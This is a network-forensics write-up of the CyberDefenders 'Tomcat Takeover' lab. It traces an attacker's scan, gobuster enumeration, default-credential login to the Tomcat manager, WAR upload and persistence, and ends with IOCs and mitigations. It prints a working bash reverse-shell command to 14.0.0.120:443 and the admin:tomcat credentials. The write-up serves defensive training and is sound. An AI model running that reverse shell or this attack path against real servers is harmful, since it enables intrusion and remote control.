# CyberDefenders - Tomcat Takeover (PCAP) Write-up

**Challenge:** [Tomcat Takeover](https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/)  
**Platform:** [CyberDefenders](https://cyberdefenders.org/)  
**Tags:** Network forensics, Wireshark, Apache Tomcat, web shell

---

## Summary

An intranet Tomcat server was hit from **`14.0.0.120`** (**China**). The attacker port-scanned, used **gobuster** to enumerate paths, found the manager UI on **port 8080** at **`/manager`**, brute-forced **`admin:tomcat`**, uploaded malicious WAR **`JXQOZY.war`**, and scheduled a bash reverse shell to **`14.0.0.120:443`** for persistence.

---

## Scenario

The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server.

---

## Objectives

- Analyze the PCAP to map reconnaissance through post-exploitation.
- Identify attacker infrastructure, tools, credentials, and persistence commands.

---

## Environment

- **Artifact:** Tomcat Takeover PCAP (lab package)
- **Tools:** Wireshark, [NetworkMiner](https://www.netresec.com/?page=NetworkMiner) (optional), IP geolocation, [CyberChef](https://gchq.github.io/CyberChef/)

**Useful Wireshark filters:**

```text
ip.src == 14.0.0.120
http.request.method == "GET"
http.request.method == "POST"
http.response.code == 200
http.request.uri contains "manager"
tcp.flags == 0x012          # PSH+ACK — follow shell traffic
```

---

## Evidence & Findings

### T1 — Scanner source IP

**Question:** Can you identify the source IP address responsible for initiating these requests on our server?

- **What I checked:** PCAP overview and **Statistics → Conversations → IPv4** — who talks to many destination ports in a short window?
- **Evidence:** **`14.0.0.120`** hits a wide port range on the victim (including **22/SSH** and web ports) — classic port-scan pattern.
- **Reasoning:** One external-ish host probing many services is your starting pivot for all follow-on HTTP and shell traffic.

**Answer:** **`14.0.0.120`**

---

### T2 — Attacker origin country

**Question:** Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

- **What I checked:** IP geolocation lookup for **`14.0.0.120`**.
- **Evidence:** Geolocation resolves to **China**.
- **Reasoning:** Geo is context for blocking and reporting — not proof of attacker nationality, but useful for SOC triage.

**Answer:** **`China`**

---

### T3 — Admin panel port

**Question:** Which of these ports provides access to the web server admin panel?

- **What I checked:** HTTP **GET** requests from **`14.0.0.120`** — which port serves **`/admin`** or Tomcat manager paths?
- **Evidence:** Admin-related HTTP traffic on **TCP port 8080** (default Tomcat HTTP connector).
- **Reasoning:** Tomcat’s HTML manager and app admin interfaces are commonly exposed on **8080** when not behind a reverse proxy.

**Answer:** **`8080`**

---

### T4 — Directory enumeration tool

**Question:** Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

- **What I checked:** HTTP request headers from the attacker — **User-Agent** field.
- **Evidence:** User-Agent contains **`gobuster`** — a popular directory/file brute-forcing tool.
- **Reasoning:** Offensive tools often identify themselves in User-Agent strings unless deliberately spoofed.

**Answer:** **`gobuster`**

---

### T5 — Admin panel directory discovered

**Question:** Which specific directory related to the admin panel did the attacker uncover?

- **What I checked:** HTTP URIs from **`14.0.0.120`** after enumeration — look for Tomcat manager paths and **401 Unauthorized** bursts (failed logins).
- **Evidence:** Repeated requests to **`/manager`** with many **401** responses, then eventual **200** after successful auth.
- **Reasoning:** Apache Tomcat’s built-in **Manager Application** lives at **`/manager`** — the standard target for credential brute force and WAR upload.

**Answer:** **`/manager`**

---

### T6 — Successful login credentials

**Question:** Can you determine the correct username and password that the attacker successfully used for login?

- **What I checked:** HTTP stream to **`/manager`** — find the first **200 OK** after a series of **401**s; inspect **Authorization** header.
- **Evidence:** Successful request uses **HTTP Basic** auth with Base64 blob. Decode in CyberChef:

  ```text
  YWRtaW46dG9tY2F0  →  admin:tomcat
  ```

- **Reasoning:** Tomcat’s default weak combo **`admin`/`tomcat`** is a well-known misconfiguration — exactly what brute force finds.

**Answer:** **`admin:tomcat`**

---

### T7 — Uploaded malicious file

**Question:** Can you identify the name of this malicious file from the captured data?

- **What I checked:** HTTP **POST** from **`14.0.0.120`** to **`/manager`** after successful login (WAR deploy upload).
- **Evidence:** Multipart upload of a **`.war`** archive — filename **`JXQOZY.war`**. WAR files are Java web application bundles; attacker-controlled WAR = web shell / backdoor.
- **Reasoning:** Tomcat manager allows deploying WARs remotely — uploading a random-named WAR is a common path to RCE on the server.

**Answer:** **`JXQOZY.war`**

---

### T8 — Persistence / reverse shell command

**Question:** From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

- **What I checked:** Post-exploit traffic from **`14.0.0.120`** — filter **`tcp.flags == 0x012`** (PSH+ACK payload) and **Follow TCP Stream** for shell commands (cron/at/scheduled task).
- **Evidence:** Scheduled command for persistence:

  ```bash
  /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
  ```

- **Reasoning:** Classic bash **reverse shell** — connects back to the attacker on **443**. Scheduling it keeps access after the initial WAR session ends.

**Answer:** **`/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'`**

---

## Key IOCs

| Type | Indicator |
|------|-----------|
| **Attacker IP** | `14.0.0.120` |
| **Origin** | China (geolocation) |
| **Tomcat port** | `8080` |
| **Manager path** | `/manager` |
| **Credentials** | `admin` / `tomcat` |
| **Malicious WAR** | `JXQOZY.war` |
| **Enum tool** | gobuster (User-Agent) |
| **Reverse shell** | `14.0.0.120:443` |
| **Persistence cmd** | bash reverse shell (see T8) |

---

## Attack reconstruction

```text
[14.0.0.120 — China]
    → Port scan (many ports incl. 22, 8080)
    → gobuster directory enumeration
    → Discover /manager on :8080
    → Brute force → admin:tomcat (HTTP Basic)
    → POST deploy JXQOZY.war
    → Reverse shell + schedule:
        /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
```

---

## MITRE ATT&CK

| Technique | Name | Lab tie-in |
|-----------|------|------------|
| **T1046** | Network Service Discovery | Port scan (T1) |
| **T1595** | Active Scanning | gobuster (T4) |
| **T1087** | Account Discovery | /manager probing (T5) |
| **T1110** | Brute Force | admin:tomcat (T6) |
| **T1190** | Exploit Public-Facing Application | Tomcat manager abuse |
| **T1505.003** | Web Shell | JXQOZY.war (T7) |
| **T1059.004** | Unix Shell | bash reverse shell (T8) |
| **T1053** | Scheduled Task/Job | Persistence command (T8) |
| **T1071.001** | Web Protocols | HTTP on 8080 |

---

## Mitigation / hardening

1. **Disable or restrict** Tomcat **Manager** (`/manager`) — VPN/IP allowlist only, or remove entirely.
2. Change default credentials; use strong passwords and lockout on failed logins.
3. Block **`14.0.0.120`**; alert on WAR uploads to Tomcat from untrusted sources.
4. Do not expose **8080** to untrusted networks; put Tomcat behind a hardened reverse proxy.
5. Hunt for deployed WARs with random names (`JXQOZY.war`) and cron entries with **`/dev/tcp/`** patterns.

---

## References

- Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/tomcat-takeover/
- MITRE T1505.003: https://attack.mitre.org/techniques/T1505/003/
- Apache Tomcat Manager: https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html
